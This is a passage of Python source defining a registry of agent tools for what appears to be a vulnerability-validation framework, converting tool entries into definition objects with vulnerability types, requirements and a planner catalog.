        if type(self.automatic_allowed) is not bool:
            raise TypeError("automatic_allowed must be a boolean")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tool_id": self.tool_id,
            "validator_id": self.validator_id,
            "vulnerability_types": list(self.vulnerability_types),
            "description": self.description,
            "requires_all": list(self.requires_all),
            "requires_any": list(self.requires_any),
            "provides": list(self.provides),
            "automatic_allowed": self.automatic_allowed,
            "allowed_options": list(self.allowed_options),
        }


def _build_default_definitions() -> Tuple[AgentToolDefinition, ...]:
    """Build AgentToolDefinition objects from TOOL_REGISTRY for backward compat."""
    definitions = []
    for tool_id, tool in TOOL_REGISTRY.items():
        validator_id = _VALIDATOR_ID_MAP.get(tool_id)
        metadata = _VALIDATOR_TOOL_METADATA.get(tool_id, {})
        vuln_types = tuple(tool.vuln_types) if tool.vuln_types else ("unknown",)
        definitions.append(AgentToolDefinition(
            tool_id=tool_id,
            validator_id=validator_id,
            vulnerability_types=vuln_types,
            description=tool.description,
            requires_all=metadata.get("requires_all", ()),
            requires_any=metadata.get("requires_any", ()),
            provides=metadata.get("provides", ()),
            automatic_allowed=True,
            allowed_options=metadata.get("allowed_options", ()),
        ))
    return tuple(definitions)


_DEFAULT_AGENT_TOOLS = _build_default_definitions()


class AgentToolRegistry:
    """Backward-compatible agent tool registry wrapping TOOL_REGISTRY."""

    def __init__(
        self,
        definitions: Optional[Iterable[AgentToolDefinition]] = None,
    ) -> None:
        if definitions is None:
            definitions = _DEFAULT_AGENT_TOOLS
        records: Dict[str, AgentToolDefinition] = {}
        for definition in definitions:
            if not isinstance(definition, AgentToolDefinition):
                raise TypeError("agent tools must be AgentToolDefinition objects")
            if definition.tool_id in records:
                raise ValueError(f"duplicate agent tool {definition.tool_id!r}")
            records[definition.tool_id] = definition
        self._tools: Mapping[str, AgentToolDefinition] = MappingProxyType(records)

    def require(self, tool_id: str) -> AgentToolDefinition:
        try:
            return self._tools[tool_id]
        except KeyError:
            raise UnknownAgentToolError(
                f"unknown agent tool {tool_id!r}"
            ) from None

    def list_tools(self) -> Tuple[AgentToolDefinition, ...]:
        return tuple(self._tools[key] for key in sorted(self._tools))

    def planner_catalog(self) -> Tuple[Dict[str, Any], ...]:
        return tuple(tool.to_dict() for tool in self.list_tools())